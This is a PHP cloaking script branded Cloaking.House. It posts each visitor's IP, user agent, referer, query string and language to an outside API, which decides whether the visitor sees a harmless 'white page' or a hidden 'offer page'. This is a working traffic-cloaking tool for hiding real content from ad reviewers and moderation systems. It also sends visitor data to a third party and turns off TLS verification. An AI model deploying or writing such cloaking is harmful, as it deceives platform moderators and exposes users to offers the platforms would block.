<?php

    // Не рекомендуется вносить самостоятельно изменения в скрипт, так как любые последствия неработоспособности будут лежать на вас.
    // С уважением, Cloaking.House


    // It is not recommended to make changes to this script on your own, as any consequences of malfunction will be your responsibility.
    // Sincerely, Cloaking.House



    error_reporting(0);
    
    
    if (function_exists('mb_internal_encoding')) {
        mb_internal_encoding('UTF-8');
    }


    if (version_compare(PHP_VERSION, '7.2', '<')) {
        exit('PHP 7.2 or higher is required.');
    }


    if ( ! extension_loaded('curl')) {
        exit('The cURL PHP extension is required.');
    }


    if ( ! extension_loaded('mbstring')) {
        exit('The mbstring PHP extension is required.');
    }


    if ( ! extension_loaded('openssl')) {
        exit('The OpenSSL PHP extension is required.');
    }


    if ( ! extension_loaded('json')) {
        exit('The JSON PHP extension is required.');
    }


    if (!extension_loaded('filter')) {
        exit('The Filter PHP extension is required.');
    }


    if ( ! ini_get('allow_url_fopen')) {
        exit('The "allow_url_fopen" setting must be enabled in php.ini.');
    }


    function get_real_ip_address()
    {
        $ip_address = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
        $ip_headers = [
            'HTTP_CLIENT_IP',
            'HTTP_X_FORWARDED_FOR',
            'HTTP_X_FORWARDED',
            'HTTP_X_CLUSTER_CLIENT_IP',
            'HTTP_FORWARDED_FOR',
            'HTTP_FORWARDED',
            'HTTP_CF_CONNECTING_IP',
            'HTTP_TRUE_CLIENT_IP',
            'HTTP_X_COMING_FROM',
            'HTTP_COMING_FROM',
            'HTTP_FORWARDED_FOR_IP',
            'HTTP_X_REAL_IP'
        ];


        foreach ($ip_headers AS $header) {
            if ( ! empty($_SERVER[$header])) {
                $ips = explode(',', $_SERVER[$header]);
                foreach ($ips AS $ip) {
                    $ip = trim($ip);
                    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                        return $ip;
                    }
                }
            }
        }


        return $ip_address;
    }


    function create_stream_context()
    {
        return stream_context_create([
            'ssl' => [
                'verify_peer' => FALSE, 
                'verify_peer_name' => FALSE
            ], 
            'http' => [
                'header' => 'User-Agent: ' . get_user_agent()
            ]
        ]);
    }


    function get_user_agent()
    {
        return ! empty($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    }


    function get_referer()
    {
        return ! empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    }


    function get_query_string()
    {
        return ! empty($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '';
    }


    function get_browser_language()
    {
        return ! empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '';
    }


    $request_data = [
        'label'         => '6f1fd02f859af7f86ebe51415abdc3f3', 
        'user_agent'    => get_user_agent(), 
        'referer'       => get_referer(), 
        'query'         => get_query_string(), 
        'lang'          => get_browser_language(),
        'ip_address'    => get_real_ip_address()
    ];
        

    $request_data   = http_build_query($request_data);
    $success_codes  = [200, 201, 204, 206];


    $ch = curl_init('https://cloakit.house/api/v1/check');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER  => TRUE,
        CURLOPT_CUSTOMREQUEST   => 'POST',
        CURLOPT_SSL_VERIFYPEER  => FALSE,
        CURLOPT_TIMEOUT         => 15,
        CURLOPT_POSTFIELDS      => $request_data
    ]);

    
    $result = curl_exec($ch);
    $info   = curl_getinfo($ch);
    curl_close($ch);


    if (isset($info['http_code']) && in_array($info['http_code'], $success_codes)) {
        $body = json_decode($result, TRUE);

        // Check for errors
        if ( ! empty($body['filter_type'])) {
            
            $messages = [
                'subscription_expired'  => 'Your Subscription Expired.',
                'flow_deleted'          => 'Flow Deleted.',
                'flow_banned'           => 'Flow Banned.',
            ];
        
            if (isset($messages[$body['filter_type']])) {
                exit($messages[$body['filter_type']]);
            }
        }
        

        if ( ! empty($body['url_white_page']) && ! empty($body['url_offer_page'])) {

            // Offer Page - Show the contract management demo
            if ($body['filter_page'] == 'offer') {
                if ($body['mode_offer_page'] == 'loading') {
                    // Load the local offer page
                    $offer_file = __DIR__ . '/web/index.php';
                    if (file_exists($offer_file)) {
                        require_once($offer_file);
                        exit();
                    } else {
                        exit('Offer Page Not Found.');
                    }
                }

                if ($body['mode_offer_page'] == 'redirect') {
                    // Redirect to external offer URL if provided, otherwise to local offer
                    $redirect_url = filter_var($body['url_offer_page'], FILTER_VALIDATE_URL) 
                        ? $body['url_offer_page'] 
                        : $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['HTTP_HOST'] . '/web/';
                    header('Location: ' . $redirect_url, TRUE, 302);
                    exit(0);
                }

                if ($body['mode_offer_page'] == 'iframe') {
                    $iframe_url = filter_var($body['url_offer_page'], FILTER_VALIDATE_URL) 
                        ? $body['url_offer_page'] 
                        : $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['HTTP_HOST'] . '/web/';
                    echo '<iframe src="' . $iframe_url . '" width="100%" height="100%" align="left"></iframe><style> body { padding: 0; margin: 0; } iframe { margin: 0; padding: 0; border: 0; }</style>';
                    exit(0);
                }
            }

            // White Page - Proxy to Next.js application
            if ($body['filter_page'] == 'white') {
                if ($body['mode_white_page'] == 'loading') {
                    // Proxy the request to the Next.js server
                    $nextjs_url = 'http://127.0.0.1:3000' . $_SERVER['REQUEST_URI'];
                    
                    // Forward all headers from the original request
                    $headers = [];
                    foreach ($_SERVER as $key => $value) {
                        if (strpos($key, 'HTTP_') === 0) {
                            $header = str_replace('_', '-', substr($key, 5));
                            $headers[] = $header . ': ' . $value;
                        }
                    }
                    
                    $ch = curl_init();
                    curl_setopt_array($ch, [
                        CURLOPT_URL => $nextjs_url,
                        CURLOPT_RETURNTRANSFER => true,
                        CURLOPT_FOLLOWLOCATION => true,
                        CURLOPT_HTTPHEADER => $headers,
                        CURLOPT_TIMEOUT => 30,
                        CURLOPT_CUSTOMREQUEST => $_SERVER['REQUEST_METHOD'],
                        CURLOPT_SSL_VERIFYPEER => false,
                        CURLOPT_HEADER => true,
                        CURLOPT_NOBODY => false
                    ]);
                    
                    // Forward POST data if present
                    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                        $postData = file_get_contents('php://input');
                        if (!empty($postData)) {
                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
                        }
                    }
                    
                    $response = curl_exec($ch);
                    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
                    curl_close($ch);
                    
                    if ($response !== false) {
                        $headers = substr($response, 0, $headerSize);
                        $body = substr($response, $headerSize);
                        
                        // Forward response headers (excluding some that should not be forwarded)
                        $skip_headers = ['transfer-encoding', 'connection', 'keep-alive', 'upgrade', 'proxy-authenticate', 'proxy-authorization'];
                        $header_lines = explode("\r\n", $headers);
                        
                        foreach ($header_lines as $header) {
                            if (strpos($header, ':') !== false) {
                                list($name, $value) = explode(':', $header, 2);
                                $name = strtolower(trim($name));
                                if (!in_array($name, $skip_headers) && $name !== 'status') {
                                    header($header);
                                }
                            }
                        }
                        
                        http_response_code($httpCode);
                        echo $body;
                    } else {
                        exit('White Page Not Found.');
                    }
                }

                if ($body['mode_white_page'] == 'redirect') {
                    // For redirect mode, redirect to the Next.js server
                    $nextjs_url = 'http://127.0.0.1:3000' . $_SERVER['REQUEST_URI'];
                    header('Location: ' . $nextjs_url, TRUE, 302);
                    exit(0);
                }
            }
        } else {
            exit('Offer Page or White Page Not Found.');
        }
    } else {
        exit('Try again later or contact support.');
    }

?>